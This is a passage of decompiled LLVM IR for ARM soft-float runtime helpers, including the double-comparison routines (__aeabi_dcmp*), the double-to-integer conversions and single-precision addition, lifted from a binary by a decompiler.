  uselistorder i1* @cpsr_v, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 1024, { 0, 8, 1, 9, 2, 6, 3, 7, 5, 10, 4 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 33, { 6, 7, 8, 9, 10, 11, 5, 12, 1, 0, 2, 3, 4 }
  uselistorder i32 768, { 1, 0 }
  uselistorder i32 268435456, { 1, 6, 7, 0, 8, 9, 2, 3, 4, 5, 12, 10, 11 }
  uselistorder i32 2047, { 6, 7, 8, 2, 0, 3, 9, 1, 4, 10, 5 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_16bc0, { 1, 0 }
  uselistorder label %dec_label_pc_16ba4, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_16b70, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_16a60, { 1, 0 }
  uselistorder label %dec_label_pc_16a48, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_16be4 = call i32 @function_16bf4()
  ret i32 %v0_16be4
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_16bec = call i32 @function_16bf4()
  ret i32 %v0_16bec

; uselistorder directives
  uselistorder i32 ()* @function_16bf4, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_16bf0 = load i32, i32* @r0, align 4
  ret i32 %v0_16bf0
}

define i32 @function_16bf4() local_unnamed_addr {
dec_label_pc_16bf4:
  %v0_16bf4 = load i32, i32* @ip, align 4
  %v0_16bf8 = load i32, i32* @r1, align 4
  %v2_16bf8 = mul i32 %v0_16bf8, 2
  %v2_16bf8.off = add i32 %v2_16bf8, 4194303
  %tmp = icmp ult i32 %v2_16bf8.off, 2097152
  %v0_16c00 = load i32, i32* @r3, align 4
  %v2_16c00 = mul i32 %v0_16c00, 2
  br i1 %tmp, label %dec_label_pc_16c50, label %bb

bb:                                               ; preds = %dec_label_pc_16bf4
  %v2_16c00.off = add i32 %v2_16c00, 4194303
  %tmp21 = icmp ult i32 %v2_16c00.off, 2097152
  br i1 %tmp21, label %dec_label_pc_16c44, label %dec_label_pc_16c0c

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16c58, %dec_label_pc_16c64, %bb
  %v0_16c0c = load i32, i32* @r0, align 4
  %v4_16c0c = or i32 %v0_16c0c, %v2_16bf8
  %v6_16c0c = icmp eq i32 %v4_16c0c, 0
  br i1 %v6_16c0c, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_16c0c
  %v1_16c10 = load i32, i32* @r2, align 4
  %v5_16c10 = or i32 %v1_16c10, %v2_16c00
  %v7_16c10 = icmp eq i32 %v5_16c10, 0
  br i1 %v7_16c10, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_16c0c, %bb10
  %v5_16c14 = icmp eq i32 %v0_16c00, %v0_16bf8
  br i1 %v5_16c14, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_16c18.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_16c18 = phi i32 [ %v2_16c18.pre, %.thread..thread1_crit_edge ], [ %v1_16c10, %bb10 ]
  %v5_16c18 = icmp eq i32 %v2_16c18, %v0_16c0c
  br i1 %v5_16c18, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_16c20 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_16c20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_16c20, i32 %v0_16c20)
  %v0_16c24 = load i32, i32* @r0, align 4
  %v0_16c28 = load i32, i32* @r1, align 4
  %v1_16c28 = load i32, i32* @r3, align 4
  %v2_16c28 = xor i32 %v1_16c28, %v0_16c28
  %v3_16c28 = icmp slt i32 %v2_16c28, 0
  br i1 %v3_16c28, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_16c2c = icmp eq i32 %v0_16c28, %v1_16c28
  br i1 %v10_16c2c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_16c30 = load i32, i32* @r2, align 4
  %v4_16c30 = icmp ult i32 %v0_16c24, %v2_16c30
  br i1 %v4_16c30, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_16c2c = icmp ult i32 %v0_16c28, %v1_16c28
  br i1 %v4_16c2c, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_16c28, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_16c34 = and i32 %v1_16c28, 1073741824
  %v3_16c34 = icmp eq i32 %v2_16c34, 0
  %v4_16c34 = ashr i32 %v1_16c28, 31
  br i1 %v3_16c34, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_16c38.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_16c34, %bb15 ]
  %v5_16c38 = sub nsw i32 -1, %v4_16c38.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_16c3c = phi i32 [ %v4_16c34, %bb15 ], [ %v5_16c38, %.thread3 ]
  %v1_16c3c = or i32 %v0_16c3c, 1
  ret i32 %v1_16c3c

dec_label_pc_16c44:                               ; preds = %bb
  br label %dec_label_pc_16c58

dec_label_pc_16c50:                               ; preds = %dec_label_pc_16bf4
  %v0_16c50 = load i32, i32* @r0, align 4
  %v4_16c50 = mul i32 %v0_16bf8, 4096
  %v5_16c50 = or i32 %v0_16c50, %v4_16c50
  %v7_16c50 = icmp eq i32 %v5_16c50, 0
  br i1 %v7_16c50, label %dec_label_pc_16c50.dec_label_pc_16c58_crit_edge, label %dec_label_pc_16c6c

dec_label_pc_16c50.dec_label_pc_16c58_crit_edge:  ; preds = %dec_label_pc_16c50
  %v2_16c00.off20 = add i32 %v2_16c00, 4194303
  %tmp22 = icmp ult i32 %v2_16c00.off20, 2097152
  br label %dec_label_pc_16c58

dec_label_pc_16c58:                               ; preds = %dec_label_pc_16c50.dec_label_pc_16c58_crit_edge, %dec_label_pc_16c44
  %v3_16c5c.pre-phi = phi i1 [ %tmp22, %dec_label_pc_16c50.dec_label_pc_16c58_crit_edge ], [ true, %dec_label_pc_16c44 ]
  br i1 %v3_16c5c.pre-phi, label %dec_label_pc_16c64, label %dec_label_pc_16c0c

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c58
  %v0_16c64 = load i32, i32* @r2, align 4
  %v4_16c64 = mul i32 %v0_16c00, 4096
  %v5_16c64 = or i32 %v0_16c64, %v4_16c64
  %v7_16c64 = icmp eq i32 %v5_16c64, 0
  br i1 %v7_16c64, label %dec_label_pc_16c0c, label %dec_label_pc_16c6c

dec_label_pc_16c6c:                               ; preds = %dec_label_pc_16c50, %dec_label_pc_16c64
  ret i32 %v0_16bf4

; uselistorder directives
  uselistorder i32 %v4_16c34, { 1, 0 }
  uselistorder i32 %v1_16c28, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_16c28, { 2, 1, 0 }
  uselistorder i32 %v1_16c10, { 1, 0 }
  uselistorder i32 %v2_16c00, { 0, 2, 1 }
  uselistorder i32 %v0_16c00, { 1, 0, 2 }
  uselistorder i32 %v2_16bf8, { 1, 0 }
  uselistorder i32 %v0_16bf8, { 1, 0, 2 }
  uselistorder i32 31, { 21, 8, 6, 9, 11, 20, 7, 18, 4, 3, 19, 0, 10, 23, 24, 25, 5, 26, 27, 32, 33, 29, 12, 13, 14, 15, 30, 16, 17, 31, 1, 2, 22, 28 }
  uselistorder label %dec_label_pc_16c6c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16c0c, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_16c74 = load i32, i32* @r0, align 4
  %v0_16c78 = load i32, i32* @r2, align 4
  store i32 %v0_16c78, i32* @r0, align 4
  store i32 %v0_16c74, i32* @r2, align 4
  %v0_16c8c = call i32 @__aeabi_cdcmple()
  ret i32 %v0_16c8c
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_16c90 = load i32, i32* @r0, align 4
  %v1_16c94 = sext i32 %v3_16c90 to i64
  %v2_16c94 = bitcast i64 %v1_16c94 to double
  %v3_16c94 = load i32, i32* @r2, align 4
  %v4_16c94 = sext i32 %v3_16c94 to i64
  %v5_16c94 = bitcast i64 %v4_16c94 to double
  %v7_16c94 = fcmp oeq double %v2_16c94, %v5_16c94
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_16c94 = fcmp ule double %v2_16c94, %v5_16c94
  %not.v7_16c94 = xor i1 %v7_16c94, true
  %v1_16c98 = and i1 %not.v6_16c94, %not.v7_16c94
  store i1 %v7_16c94, i1* @cpsr_z, align 1
  br i1 %v1_16c98, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_16c94, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_16c90

; uselistorder directives
  uselistorder i1 %v7_16c94, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_16cac = call i32 @__aeabi_cdcmple()
  %v0_16cb0 = load i1, i1* @cpsr_z, align 1
  %.v0_16cac. = zext i1 %v0_16cb0 to i32
  ret i32 %.v0_16cac.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_16cc4 = call i32 @__aeabi_cdcmple()
  %v0_16cc8 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_16cc8 to i32
  %.v0_16cc4. = xor i32 %tmp2, 1
  ret i32 %.v0_16cc4.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_16cdc = call i32 @__aeabi_cdcmple()
  %v0_16ce0 = load i1, i1* @cpsr_z, align 1
  %v1_16ce0 = load i1, i1* @cpsr_c, align 1
  %v2_16ce0 = xor i1 %v1_16ce0, true
  %v3_16ce0 = or i1 %v0_16ce0, %v2_16ce0
  %.v0_16cdc = select i1 %v3_16ce0, i32 1, i32 %v0_16cdc
  %v2_16ce4 = xor i1 %v0_16ce0, true
  %v3_16ce4 = and i1 %v1_16ce0, %v2_16ce4
  %..v0_16cdc = select i1 %v3_16ce4, i32 0, i32 %.v0_16cdc
  ret i32 %..v0_16cdc

; uselistorder directives
  uselistorder i1 %v1_16ce0, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %v0_16cf4 = call i32 @__aeabi_cdrcmple()
  %v0_16cf8 = load i1, i1* @cpsr_z, align 1
  %v1_16cf8 = load i1, i1* @cpsr_c, align 1
  %v2_16cf8 = xor i1 %v1_16cf8, true
  %v3_16cf8 = or i1 %v0_16cf8, %v2_16cf8
  %.v0_16cf4 = select i1 %v3_16cf8, i32 1, i32 %v0_16cf4
  %v2_16cfc = xor i1 %v0_16cf8, true
  %v3_16cfc = and i1 %v1_16cf8, %v2_16cfc
  %..v0_16cf4 = select i1 %v3_16cfc, i32 0, i32 %.v0_16cf4
  ret i32 %..v0_16cf4

; uselistorder directives
  uselistorder i1 %v1_16cf8, { 1, 0 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_16d0c = call i32 @__aeabi_cdrcmple()
  %v0_16d10 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_16d10 to i32
  %.v0_16d0c. = xor i32 %tmp2, 1
  ret i32 %.v0_16d0c.

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_16d20 = mul i32 %arg2, 2
  %v1_16d24 = add i32 %v2_16d20, 2097152
  %v2_16d24 = icmp ugt i32 %v2_16d20, -2097153
  br i1 %v2_16d24, label %dec_label_pc_16d60, label %dec_label_pc_16d2c

dec_label_pc_16d2c:                               ; preds = %entry
  %v6_16d24 = icmp slt i32 %v1_16d24, 0
  br i1 %v6_16d24, label %dec_label_pc_16d30, label %dec_label_pc_16d58

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d2c
  %v4_16d34 = sdiv i32 %v1_16d24, 2097152
  %v1_16d24.off = add i32 %v2_16d20, 2086666239
  %tmp = icmp ult i32 %v1_16d24.off, 2097152
  %v2_16d38 = icmp ugt i32 %v4_16d34, -993
  %v3_16d38 = or i1 %tmp, %v2_16d38
  br i1 %v3_16d38, label %dec_label_pc_16d68, label %dec_label_pc_16d3c

dec_label_pc_16d3c:                               ; preds = %dec_label_pc_16d30
  %v5_16d34 = sub nsw i32 -993, %v4_16d34
  %v3_16d3c = mul i32 %arg2, 2048
  %v4_16d44 = udiv i32 %arg1, 2097152
  %v1_16d40 = or i32 %v4_16d44, %v3_16d3c
  %v5_16d44 = or i32 %v1_16d40, -2147483648
  %v3_16d48 = icmp sgt i32 %arg2, -1
  %v6_16d4c = lshr i32 %v5_16d44, %v5_16d34
  %v2_16d50 = sub i32 0, %v6_16d4c
  %v6_16d4c.v2_16d50 = select i1 %v3_16d48, i32 %v6_16d4c, i32 %v2_16d50
  ret i32 %v6_16d4c.v2_16d50

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d2c
  ret i32 0

dec_label_pc_16d60:                               ; preds = %entry
  %v4_16d60 = mul i32 %arg2, 4096
  %v5_16d60 = or i32 %v4_16d60, %arg1
  %v7_16d60 = icmp eq i32 %v5_16d60, 0
  br i1 %v7_16d60, label %dec_label_pc_16d68, label %dec_label_pc_16d74

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d60, %dec_label_pc_16d30
  %v1_16d68 = and i32 %arg2, -2147483648
  %v3_16d68 = icmp eq i32 %v1_16d68, 0
  br i1 %v3_16d68, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_16d68
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_16d68, %bb
  %v1_16d70 = phi i32 [ %v1_16d68, %dec_label_pc_16d68 ], [ 2147483647, %bb ]
  ret i32 %v1_16d70

dec_label_pc_16d74:                               ; preds = %dec_label_pc_16d60
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_16d34, { 1, 0 }
  uselistorder i32 2147483647, { 2, 3, 0, 5, 6, 1, 4 }
  uselistorder i32 %arg2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16d7c = icmp slt i32 %arg2, 0
  %v2_16d7c = mul i32 %arg2, 2
  br i1 %v1_16d7c, label %dec_label_pc_16db0, label %dec_label_pc_16d84

dec_label_pc_16d84:                               ; preds = %entry
  %v1_16d84 = add i32 %v2_16d7c, 2097152
  %v2_16d84 = icmp ugt i32 %v2_16d7c, -2097153
  br i1 %v2_16d84, label %dec_label_pc_16db8, label %dec_label_pc_16d8c

dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d84
  %v6_16d84 = icmp slt i32 %v1_16d84, 0
  br i1 %v6_16d84, label %dec_label_pc_16d90, label %dec_label_pc_16db0

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d8c
  %v4_16d94 = sdiv i32 %v1_16d84, 2097152
  %v5_16d94 = sub nsw i32 -993, %v4_16d94
  %v11_16d94 = icmp slt i32 %v5_16d94, 0
  br i1 %v11_16d94, label %dec_label_pc_16dc0, label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d90
  %v3_16d9c = mul i32 %arg2, 2048
  %v4_16da4 = udiv i32 %arg1, 2097152
  %v1_16da0 = or i32 %v4_16da4, %v3_16d9c
  %v5_16da4 = or i32 %v1_16da0, -2147483648
  %v6_16da8 = lshr i32 %v5_16da4, %v5_16d94
  ret i32 %v6_16da8

dec_label_pc_16db0:                               ; preds = %dec_label_pc_16d8c, %entry
  ret i32 0

dec_label_pc_16db8:                               ; preds = %dec_label_pc_16d84
  %v4_16db8 = mul i32 %arg2, 4096
  %v5_16db8 = or i32 %v4_16db8, %arg1
  %v7_16db8 = icmp eq i32 %v5_16db8, 0
  br i1 %v7_16db8, label %dec_label_pc_16dc0, label %dec_label_pc_16dc8

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16db8, %dec_label_pc_16d90
  ret i32 -1

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16db8
  ret i32 0

; uselistorder directives
  uselistorder i32 -993, { 1, 2, 0 }
  uselistorder i32 2097152, { 9, 10, 23, 11, 1, 12, 24, 0, 2, 3, 13, 14, 4, 5, 6, 15, 16, 17, 7, 8, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__aeabi_frsub(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16dd0 = sub i32 0, %arg1
  %v1_16dd4 = call i32 @__aeabi_fadd(i32 %v1_16dd0)
  ret i32 %v1_16dd4
}

define i32 @__subsf3(i32 %arg1) local_unnamed_addr {
entry:
  %v2_16dd8 = load i32, i32* @r0, align 4
  ret i32 %v2_16dd8
}

define i32 @__aeabi_fadd(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v2_16ddc = mul i32 %arg1, 2
  store i32 %v2_16ddc, i32* %r2.global-to-local, align 4
  %v4_16ddc = icmp eq i32 %v2_16ddc, 0
  %v0_16f14.pre = load i32, i32* @r1, align 4
  br i1 %v4_16ddc, label %dec_label_pc_16f14, label %bb

bb:                                               ; preds = %entry
  %v3_16de0 = mul i32 %v0_16f14.pre, 2
  store i32 %v3_16de0, i32* %r3.global-to-local, align 4
  %v5_16de0 = icmp eq i32 %v3_16de0, 0
  br i1 %v5_16de0, label %dec_label_pc_16f14, label %bb78

bb78:                                             ; preds = %bb
  %v5_16de4 = icmp eq i32 %v3_16de0, %v2_16ddc
  br i1 %v5_16de4, label %dec_label_pc_16f14, label %bb79

bb79:                                             ; preds = %bb78
  %v2_16ddc.off = add i32 %v2_16ddc, 33554431
  %tmp111 = icmp ult i32 %v2_16ddc.off, 16777216
  br i1 %tmp111, label %dec_label_pc_16f14, label %bb80

bb80:                                             ; preds = %bb79
  %v3_16de0.off = add i32 %v3_16de0, 33554431
  %tmp112 = icmp ult i32 %v3_16de0.off, 16777216
  br i1 %tmp112, label %dec_label_pc_16f14, label %dec_label_pc_16df4

dec_label_pc_16df4:                               ; preds = %bb80
  %tmp = udiv i32 %arg1, 8388608
  %v3_16df4 = urem i32 %tmp, 256
  store i32 %v3_16df4, i32* %r2.global-to-local, align 4
  %tmp107 = udiv i32 %v0_16f14.pre, 8388608
  %v4_16df8 = urem i32 %tmp107, 256
  %v5_16df8 = sub nsw i32 %v4_16df8, %v3_16df4
  store i32 %v5_16df8, i32* %r3.global-to-local, align 4
  %v7_16dfc = icmp ugt i32 %v4_16df8, %v3_16df4
  br i1 %v7_16dfc, label %bb81, label %.thread11

bb81:                                             ; preds = %dec_label_pc_16df4
  store i32 %v4_16df8, i32* %r2.global-to-local, align 4
  store i32 %v0_16f14.pre, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r1, align 4
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_16df4, %bb81
  %v5_16e0c = icmp ult i32 %v4_16df8, %v3_16df4
  br i1 %v5_16e0c, label %bb82, label %bb83

bb82:                                             ; preds = %.thread11
  %v7_16e0c = sub nsw i32 0, %v5_16df8
  store i32 %v7_16e0c, i32* %r3.global-to-local, align 4
  br label %bb83

bb83:                                             ; preds = %.thread11, %bb82
  %v0_16e10 = phi i32 [ %v5_16df8, %.thread11 ], [ %v7_16e0c, %bb82 ]
  %v0_16e14 = load i32, i32* @lr, align 4
  %tmp113 = icmp ugt i32 %v0_16e10, 25
  call void @__pseudo_cond_branch(i1 %tmp113, i32 %v0_16e14)
  %v0_16e18 = load i32, i32* %r0.global-to-local, align 4
  %v3_16e18 = icmp sgt i32 %v0_16e18, -1
  %v1_16e1c = urem i32 %v0_16e18, 8388608
  %v1_16e20 = or i32 %v1_16e1c, 8388608
  %v2_16e24 = sub nsw i32 0, %v1_16e20
  %v1_16e20.v2_16e24 = select i1 %v3_16e18, i32 %v1_16e20, i32 %v2_16e24
  store i32 %v1_16e20.v2_16e24, i32* %r0.global-to-local, align 4
  %v0_16e28 = load i32, i32* @r1, align 4
  %v3_16e28 = icmp sgt i32 %v0_16e28, -1
  %v1_16e2c = urem i32 %v0_16e28, 8388608
  %v1_16e30 = or i32 %v1_16e2c, 8388608
  %v2_16e34 = sub nsw i32 0, %v1_16e30
  %storemerge1 = select i1 %v3_16e28, i32 %v1_16e30, i32 %v2_16e34
  %v0_16e38 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e38 = load i32, i32* %r3.global-to-local, align 4
  %v4_16e38 = icmp eq i32 %v1_16e38, %v0_16e38
  br i1 %v4_16e38, label %dec_label_pc_16efc, label %dec_label_pc_16e40

dec_label_pc_16e40:                               ; preds = %.thread16, %.thread17, %bb83
  %v0_16e48 = phi i32 [ %v2_16f0c, %.thread17 ], [ %v1_16e38, %.thread16 ], [ %v1_16e38, %bb83 ]
  %v0_16e4c = phi i32 [ %v1_16f00, %.thread17 ], [ %v1_16f00, %.thread16 ], [ %storemerge1, %bb83 ]
  %v0_16e44 = phi i32 [ %v1_16e20.v2_16e24, %.thread17 ], [ %v2_16f04, %.thread16 ], [ %v1_16e20.v2_16e24, %bb83 ]
  %v0_16e40 = phi i32 [ %v0_16e38, %.thread17 ], [ 1, %.thread16 ], [ %v0_16e38, %bb83 ]
  %v1_16e40 = add i32 %v0_16e40, -1
  store i32 %v1_16e40, i32* %r2.global-to-local, align 4
  %v7_16e44 = ashr i32 %v0_16e4c, %v0_16e48
  %v8_16e44 = add i32 %v7_16e44, %v0_16e44
  store i32 %v8_16e44, i32* %r0.global-to-local, align 4
  %v14_16e44 = icmp slt i32 %v8_16e44, 0
  %v1_16e48 = sub i32 32, %v0_16e48
  %v6_16e4c = shl i32 %v0_16e4c, %v1_16e48
  %v1_16e50 = and i32 %v8_16e44, -2147483648
  store i32 %v1_16e50, i32* %r3.global-to-local, align 4
  br i1 %v14_16e44, label %dec_label_pc_16e58, label %dec_label_pc_16e60

dec_label_pc_16e58:                               ; preds = %dec_label_pc_16e40
  %v1_16e58 = sub i32 0, %v6_16e4c
  %v2_16e58 = icmp eq i32 %v6_16e4c, 0
  %v2_16e5c = icmp eq i1 %v2_16e58, false
  %v5_16e5c = sext i1 %v2_16e5c to i32
  %v6_16e5c = sub i32 %v5_16e5c, %v8_16e44
  store i32 %v6_16e5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16e60

dec_label_pc_16e60:                               ; preds = %dec_label_pc_16e40, %dec_label_pc_16e58
  %v0_16e98 = phi i32 [ %v6_16e4c, %dec_label_pc_16e40 ], [ %v1_16e58, %dec_label_pc_16e58 ]
  %v0_16e9c = phi i32 [ %v8_16e44, %dec_label_pc_16e40 ], [ %v6_16e5c, %dec_label_pc_16e58 ]
  %v3_16e64 = icmp ult i32 %v0_16e9c, 8388606
  br i1 %v3_16e64, label %dec_label_pc_16e98, label %dec_label_pc_16e68

dec_label_pc_16e68:                               ; preds = %dec_label_pc_16e60
  %v3_16e6c = icmp ult i32 %v0_16e9c, 16777214
  br i1 %v3_16e6c, label %dec_label_pc_16e84, label %dec_label_pc_16e70

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e68
  %v3_16e70 = udiv i32 %v0_16e9c, 2
  store i32 %v3_16e70, i32* %r0.global-to-local, align 4
  store i32 %v0_16e40, i32* %r2.global-to-local, align 4
  %v2_16e7c = icmp ugt i32 %v0_16e40, 253
  br i1 %v2_16e7c, label %dec_label_pc_16f68, label %dec_label_pc_16e84

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e98, %dec_label_pc_16e70, %dec_label_pc_16e68
  %v1_16e88 = phi i32 [ %v1_16ea4, %dec_label_pc_16e98 ], [ %v0_16e40, %dec_label_pc_16e70 ], [ %v1_16e40, %dec_label_pc_16e68 ]
  %v0_16e88 = phi i32 [ %v5_16e9c, %dec_label_pc_16e98 ], [ %v3_16e70, %dec_label_pc_16e70 ], [ %v0_16e9c, %dec_label_pc_16e68 ]
  %v2_16e88 = and i32 %v1_16e88, 512
  %v3_16e88 = icmp ne i32 %v2_16e88, 0
  %v4_16e88 = mul i32 %v1_16e88, 8388608
  %v6_16e88 = add i32 %v4_16e88, %v0_16e88
  %v7_16e88 = zext i1 %v3_16e88 to i32
  %v8_16e88 = add i32 %v7_16e88, %v6_16e88
  %v22_16e88 = icmp eq i32 %v8_16e88, 0
  br i1 %v22_16e88, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_16e84
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_16e84, %bb84
  %v0_16e90 = phi i32 [ 0, %bb84 ], [ %v8_16e88, %dec_label_pc_16e84 ]
  %v2_16e90 = or i32 %v0_16e90, %v1_16e50
  store i32 %v2_16e90, i32* %r0.global-to-local, align 4
  ret i32 %v2_16e90

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e60
  %v1_16e98 = icmp slt i32 %v0_16e98, 0
  %v3_16e9c = mul i32 %v0_16e9c, 2
  %v4_16e9c = zext i1 %v1_16e98 to i32
  %v5_16e9c = or i32 %v4_16e9c, %v3_16e9c
  store i32 %v5_16e9c, i32* %r0.global-to-local, align 4
  %v1_16ea0 = and i32 %v3_16e9c, 8388608
  %v2_16ea0 = icmp eq i32 %v1_16ea0, 0
  %v1_16ea4 = add i32 %v0_16e40, -2
  store i32 %v1_16ea4, i32* %r2.global-to-local, align 4
  br i1 %v2_16ea0, label %dec_label_pc_16eac, label %dec_label_pc_16e84

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16e98
  %tmp86 = udiv i32 %v0_16e9c, 2048
  %v3_16eac = urem i32 %tmp86, 1048576
  %v4_16eac = icmp eq i32 %v3_16eac, 0
  br i1 %v4_16eac, label %bb87, label %.thread12

bb87:                                             ; preds = %dec_label_pc_16eac
  %v4_16eb0 = mul i32 %v5_16e9c, 4096
  store i32 %v4_16eb0, i32* %r0.global-to-local, align 4
  %v2_16eb4 = add i32 %v0_16e40, -14
  store i32 %v2_16eb4, i32* %r2.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_16eac, %bb87
  %v1_16ec0 = phi i32 [ %v1_16ea4, %dec_label_pc_16eac ], [ %v2_16eb4, %bb87 ]
  %v1_16ebc = phi i32 [ %v5_16e9c, %dec_label_pc_16eac ], [ %v4_16eb0, %bb87 ]
  %v1_16eb8 = and i32 %v1_16ebc, 16711680
  %v2_16eb8 = icmp eq i32 %v1_16eb8, 0
  br i1 %v2_16eb8, label %bb88, label %.thread13

bb88:                                             ; preds = %.thread12
  %v4_16ebc = mul i32 %v1_16ebc, 256
  store i32 %v4_16ebc, i32* %r0.global-to-local, align 4
  %v2_16ec0 = add i32 %v1_16ec0, -8
  store i32 %v2_16ec0, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread12, %bb88
  %v1_16ecc = phi i32 [ %v1_16ec0, %.thread12 ], [ %v2_16ec0, %bb88 ]
  %v1_16ec8 = phi i32 [ %v1_16ebc, %.thread12 ], [ %v4_16ebc, %bb88 ]
  %v1_16ec4 = and i32 %v1_16ec8, 15728640
  %v2_16ec4 = icmp eq i32 %v1_16ec4, 0
  br i1 %v2_16ec4, label %bb89, label %.thread14

bb89:                                             ; preds = %.thread13
  %v4_16ec8 = mul i32 %v1_16ec8, 16
  store i32 %v4_16ec8, i32* %r0.global-to-local, align 4
  %v2_16ecc = add i32 %v1_16ecc, -4
  store i32 %v2_16ecc, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %.thread13, %bb89
  %v1_16ed8 = phi i32 [ %v1_16ecc, %.thread13 ], [ %v2_16ecc, %bb89 ]
